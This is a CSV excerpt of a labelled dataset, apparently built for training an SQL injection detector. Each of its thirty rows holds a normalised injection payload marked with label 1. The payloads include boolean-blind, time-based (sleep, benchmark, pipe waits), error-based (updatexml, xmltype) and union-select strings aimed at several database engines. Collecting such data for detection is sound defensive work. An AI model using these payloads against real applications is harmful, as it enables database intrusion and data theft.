row_index,payload_norm,label,sqli_type_hint
4110,"1"" ) rlike ( select ( case when ( 5746 = 5367 ) then 1 else 0x28 end ) ) and ( ""hnnf"" like ""hnnf",1,
4111,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'cgiu' = 'cgiu,1,
4112,1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'jzpb' = 'jzpb,1,
4113,"1' ) where 8255 = 8255 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4114,"1%"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""%"" = """,1,
4115,"1'+ ( select pxsd where 2576 = 2576 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",1,
4116,-2207%' ) or ( 8459 = 8459 ) *4906 and ( '%' = ',1,
4117,"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""ubvd"" = ""ubvd",1,
4118,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'cmqe' like 'cmqe,1,
4119,"-6766"" where 6591 = 6591 or make_set ( 9354 = 9354,7185 ) --",1,
4120,"select count ( * ) from generate_series ( 1,5000000 ) and ( 8997 = 8997",1,
4121,-7610' or 3038 = 3038,1,
4122,1'|| ( select 'gmkp' where 6016 = 6016,1,
4123,"1, ( case when 6620 = 3092 then 1 else null end )",1,
4124,"1%"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""%"" = """,1,
4125,"1 ) and elt ( 1210 = 1210,sleep ( 5 ) )",1,
4126,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 7240 = 7240",1,
4127,"-4155' ) ) ) union all select 1775,1775,1775,1775,1775,1775,1775--",1,
4128,"-8021' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'cenk' like 'cenk",1,
4129,"1%"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""%"" = """,1,
4130,"1, ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,
4131,"1 ) and elt ( 4249 = 4249,7259 ) and ( 8226 = 8226",1,
4132,-6190' ) ) ) union all select 9413--,1,
4133,"1"" where 5372 = 5372 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
4134,"-4653' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
4135,1' ) ) and 6690 = 3250#,1,
4136,( select * from ( select ( sleep ( 5 ) ) ) srmq ) ) ||',1,
4137,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'vwxg' = 'vwxg",1,
4138,select ( case when ( 2676 = 4191 ) then 2676 else 1/ ( select 0 ) end ) --,1,
4139,-6548 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- rlda,1,
